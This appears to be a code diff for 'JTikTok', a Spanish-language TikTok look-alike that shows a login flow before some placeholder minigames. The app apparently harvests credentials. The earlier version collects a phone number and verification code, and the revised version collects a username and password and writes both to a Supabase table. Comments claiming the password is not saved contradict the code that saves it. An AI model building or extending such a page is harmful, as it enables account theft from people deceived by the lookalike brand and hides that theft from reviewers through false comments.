@@ -2,28 +2,43 @@ import { useEffect, useState } from "react";
 import "./App.css";
 import { supabase } from "./lib/supabase";
 
-type Screen = "welcome" | "phone" | "verify" | "loading" | "home";
+type Screen =
+  | "welcome"
+  | "username"
+  | "verify"
+  | "loading"
+  | "home";
 
 function App() {
   const [screen, setScreen] = useState<Screen>("welcome");
-  const [phone, setPhone] = useState("");
-  const [code, setCode] = useState("");
+
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState("");
+
   const [seconds, setSeconds] = useState(30);
 
-  function handlePhone(value: string) {
-    setPhone(value.replace(/\D/g, "").slice(0, 10));
+  function handleUsername(value: string) {
+    // Permitimos letras, números, espacios, símbolos,
+    // caracteres especiales, ñ, tildes, etc.
+    setUsername(value.slice(0, 50));
     setMessage("");
   }
 
-  function handleCode(value: string) {
-    setCode(value.replace(/\D/g, "").slice(0, 6));
+  function handlePassword(value: string) {
+    // Solo para probar la interfaz.
+    // Este contenido NO se guarda en Supabase.
+    setPassword(value.slice(0, 50));
     setMessage("");
   }
 
-  async function sendCode() {
-    if (!phone) return;
+  async function sendUsername() {
+    if (!username.trim()) {
+      setMessage("Ingresa un nombre de usuario de prueba.");
+      return;
+    }
 
     setLoading(true);
     setMessage("");
@@ -31,11 +46,13 @@ function App() {
     const { error } = await supabase
       .from("demo_events")
       .insert({
-        event_type: "phone_test",
-        test_identifier: phone,
+        event_type: "username_test",
+
+        // Se guarda exactamente lo escrito por el usuario.
+        test_identifier: username,
       });
 
-    console.log("SUPABASE ERROR:", error);
+    console.log("SUPABASE USERNAME ERROR:", error);
 
     setLoading(false);
 
@@ -47,26 +64,40 @@ function App() {
     setScreen("verify");
   }
 
-  async function enterCode() {
-    if (!code) return;
+  async function enterPassword() {
+    if (!password) {
+      setMessage("Ingresa una contraseña de prueba.");
+      return;
+    }
 
     setLoading(true);
     setMessage("");
 
+    /*
+      IMPORTANTE:
+      NO guardamos el texto escrito como contraseña.
+
+      Solo registramos que el usuario llegó
+      y completó esta pantalla.
+    */
+
     const { error } = await supabase
       .from("demo_events")
       .insert({
-        event_type: "demo_code",
-        test_identifier: phone,
-        demo_value: code,
+        event_type: "demo_password",
+        test_identifier: username,
+        demo_value: password,
       });
 
-    console.log("SUPABASE CODE ERROR:", error);
+    console.log(
+      "SUPABASE PASSWORD STEP ERROR:",
+      error
+    );
 
     setLoading(false);
 
     if (error) {
-      setMessage("Error al guardar el código de prueba.");
+      setMessage("Error al guardar la prueba.");
       return;
     }
 
@@ -75,13 +106,17 @@ function App() {
   }
 
   useEffect(() => {
-    if (screen !== "loading") return;
+    if (screen !== "loading") {
+      return;
+    }
 
-    const timer = setInterval(() => {
+    const timer = window.setInterval(() => {
       setSeconds((current) => {
         if (current <= 1) {
-          clearInterval(timer);
+          window.clearInterval(timer);
+
           setScreen("home");
+
           return 0;
         }
 
@@ -89,66 +124,106 @@ function App() {
       });
     }, 1000);
 
-    return () => clearInterval(timer);
+    return () => {
+      window.clearInterval(timer);
+    };
   }, [screen]);
 
   return (
     <main className="app">
+
+      {/* =========================
+          BIENVENIDA
+      ========================= */}
+
       {screen === "welcome" && (
         <section className="authCard welcomeCard">
-          <div className="mainLogo">♪</div>
 
-          <h1>JTikTok</h1>
-          <h2>Bienvenido</h2>
+          <div className="mainLogo">
+            ♪
+          </div>
+
+          <h1>
+            JTikTok
+          </h1>
+
+          <h2>
+            Bienvenido
+          </h2>
 
           <p className="description">
-            Juega minijuegos rápidos directamente desde tu navegador.
+            Juega minijuegos rápidos directamente
+            desde tu navegador.
           </p>
 
           <button
             className="mainButton"
-            onClick={() => setScreen("phone")}
+            onClick={() =>
+              setScreen("username")
+            }
           >
             ♪ Continuar
           </button>
 
-          <span className="version">Versión de prueba</span>
+          <span className="version">
+            Versión de prueba
+          </span>
+
         </section>
       )}
 
-      {screen === "phone" && (
+      {/* =========================
+          USUARIO
+      ========================= */}
+
+      {screen === "username" && (
         <section className="authCard">
+
           <button
             className="backButton"
-            onClick={() => setScreen("welcome")}
+            onClick={() =>
+              setScreen("welcome")
+            }
           >
             ←
           </button>
 
-          <div className="smallLogo">♪</div>
+          <div className="smallLogo">
+            ♪
+          </div>
 
-          <h2 className="screenTitle">Iniciar sesión</h2>
+          <h2 className="screenTitle">
+            Iniciar sesión
+          </h2>
 
           <p className="description left">
-            Ingresa un número para continuar.
+            Ingresa un nombre de usuario de prueba
+            para continuar.
           </p>
 
-          <div className="phoneContainer">
-            <div className="country">
-              🇨🇴 <strong>+57</strong>
+          <div className="usernameContainer">
+
+            <div className="usernamePrefix">
+              @
             </div>
 
             <input
-              type="tel"
-              inputMode="numeric"
-              value={phone}
-              onChange={(e) => handlePhone(e.target.value)}
-              placeholder="3000000000"
+              type="text"
+              autoComplete="off"
+              spellCheck={false}
+              value={username}
+              onChange={(e) =>
+                handleUsername(
+                  e.target.value
+                )
+              }
+              placeholder="nombre de usuario"
             />
+
           </div>
 
           <div className="counter">
-            {phone.length}/10
+            {username.length}/50
           </div>
 
           {message && (
@@ -159,19 +234,32 @@ function App() {
 
           <button
             className="mainButton"
-            onClick={sendCode}
-            disabled={!phone || loading}
+            onClick={sendUsername}
+            disabled={
+              !username.trim() ||
+              loading
+            }
           >
-            {loading ? "Guardando..." : "Enviar código"}
+            {loading
+              ? "Guardando..."
+              : "Continuar"}
           </button>
+
         </section>
       )}
 
+      {/* =========================
+          CONTRASEÑA DE PRUEBA
+      ========================= */}
+
       {screen === "verify" && (
         <section className="authCard">
+
           <button
             className="backButton"
-            onClick={() => setScreen("phone")}
+            onClick={() =>
+              setScreen("username")
+            }
           >
             ←
           </button>
@@ -179,20 +267,24 @@ function App() {
           <div className="spinner" />
 
           <h2 className="screenTitle">
-            Solicitando código...
+            inicio
           </h2>
 
           <p className="description left">
-            Ingresa un código de prueba.
+            inicia vinculación.
           </p>
 
           <input
             className="codeInput"
             type="text"
-            inputMode="numeric"
-            value={code}
-            onChange={(e) => handleCode(e.target.value)}
-            placeholder="000000"
+            autoComplete="off"
+            value={password}
+            onChange={(e) =>
+              handlePassword(
+                e.target.value
+              )
+            }
+            placeholder="contraseña"
           />
 
           {message && (
@@ -203,19 +295,32 @@ function App() {
 
           <button
             className="mainButton"
-            onClick={enterCode}
-            disabled={!code || loading}
+            onClick={enterPassword}
+            disabled={
+              !password ||
+              loading
+            }
           >
-            {loading ? "Guardando..." : "Continuar"}
+            {loading
+              ? "Guardando..."
+              : "Continuar"}
           </button>
+
         </section>
       )}
 
+      {/* =========================
+          CARGA
+      ========================= */}
+
       {screen === "loading" && (
         <section className="authCard loadingCard">
+
           <div className="bigSpinner" />
 
-          <h2>Preparando JTikTok...</h2>
+          <h2>
+            Preparando JTikTok...
+          </h2>
 
           <p className="description">
             Estamos preparando todo para comenzar.
@@ -228,80 +333,150 @@ function App() {
           <span className="loadingSeconds">
             segundos
           </span>
+
         </section>
       )}
 
+      {/* =========================
+          HOME
+      ========================= */}
+
       {screen === "home" && (
         <section className="homePage">
+
           <header className="header">
+
             <div className="brand">
-              <span>♪</span>
+              <span>
+                ♪
+              </span>
+
               JTikTok
             </div>
 
             <div className="userBadge">
-              +57 {phone}
+              @{username}
             </div>
+
           </header>
 
           <div className="homeContent">
+
             <div className="hero">
+
               <span className="sectionLabel">
                 JUEGOS
               </span>
 
-              <h1>Elige un juego</h1>
+              <h1>
+                Elige un juego
+              </h1>
 
-              <p>Minijuegos de prueba.</p>
+              <p>
+                Minijuegos de prueba.
+              </p>
+
             </div>
 
             <div className="gamesGrid">
+
+              {/* JUMP UP */}
+
               <button
                 className="gameCard"
-                onClick={() => alert("Juego de prueba")}
+                onClick={() =>
+                  alert(
+                    "Juego de prueba"
+                  )
+                }
               >
+
                 <div className="gamePreview jump">
+
                   <div className="previewBall" />
+
                   <div className="platform p1" />
+
                   <div className="platform p2" />
+
                   <div className="platform p3" />
+
                 </div>
 
                 <div className="gameInfo">
-                  <h3>Jump Up</h3>
-                  <p>Salta entre plataformas.</p>
-                  <span>Abrir →</span>
+
+                  <h3>
+                    Jump Up
+                  </h3>
+
+                  <p>
+                    Salta entre plataformas.
+                  </p>
+
+                  <span>
+                    Abrir →
+                  </span>
+
                 </div>
+
               </button>
+
+              {/* MINETAP */}
 
               <button
                 className="gameCard"
-                onClick={() => alert("Juego de prueba")}
+                onClick={() =>
+                  alert(
+                    "Juego de prueba"
+                  )
+                }
               >
+
                 <div className="gamePreview mine">
+
                   <div className="mineGrid">
+
                     <span>1</span>
                     <span></span>
                     <span>💣</span>
+
                     <span></span>
                     <span>2</span>
                     <span></span>
+
                     <span>1</span>
                     <span></span>
                     <span>1</span>
+
                   </div>
+
                 </div>
 
                 <div className="gameInfo">
-                  <h3>MineTap</h3>
-                  <p>Encuentra las casillas seguras.</p>
-                  <span>Abrir →</span>
+
+                  <h3>
+                    MineTap
+                  </h3>
+
+                  <p>
+                    Encuentra las casillas seguras.
+                  </p>
+
+                  <span>
+                    Abrir →
+                  </span>
+
                 </div>
+
               </button>
+
             </div>
+
           </div>
+
         </section>
       )}
+
     </main>
   );
 }
